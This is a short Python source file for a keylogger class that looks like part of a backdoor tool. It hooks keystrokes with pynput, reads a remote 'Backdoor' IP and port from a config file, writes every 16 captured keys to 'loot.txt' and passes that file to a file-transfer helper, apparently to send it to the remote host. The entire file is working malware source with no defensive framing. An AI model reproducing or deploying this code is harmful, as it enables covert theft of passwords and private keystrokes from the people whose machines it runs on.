from pynput import keyboard
import encryption
import ConfigParser
from scapy.all import *
from fileUtils import FileTransfer


class Keylogger(object):
    def __init__(self):
        config = ConfigParser.ConfigParser()
        config.read('setup.config')

        self.remoteIP = config.get('Backdoor', 'remoteIP')
        self.remotePort = int(config.get ('Backdoor', 'remotePort'))
        self.localIP = config.get('Backdoor', 'localIP')
        self.localPort = int(config.get('Backdoor', 'localPort'))
        self.password = config.get('Encryption', 'password')

        self.listener = keyboard.Listener(on_press=self.onPress)
        self.savedFile = "loot.txt"
        self.buffer = ""
        self.count = 0
        self.bufferSize = 16
        self.fileTransfer = FileTransfer()

    def onPress(self, key):
        try:
            keys = key.char
        except AttributeError:
            keys = '<' + str(key) + '>'

        self.saveKey(keys)

    def start(self):
        if not self.listener.isAlive():
            self.listener = keyboard.Listener(on_press=self.onPress)
            self.listener.start()
            return True
        return False

    def stop(self):
        if self.listener.isAlive():
            self.listener.stop()
            return True
        return False

    def saveKey(self, keys):
        self.buffer += keys
        self.count += 1
        if self.count < self.bufferSize:
            return
        else:
            with open(self.savedFile, "wb") as savedFile:
                savedFile.write(self.buffer)
            self.fileTransfer.sendFile(self.savedFile)
            self.reset()

    def reset(self):
        self.buffer = ""
        self.count = 0
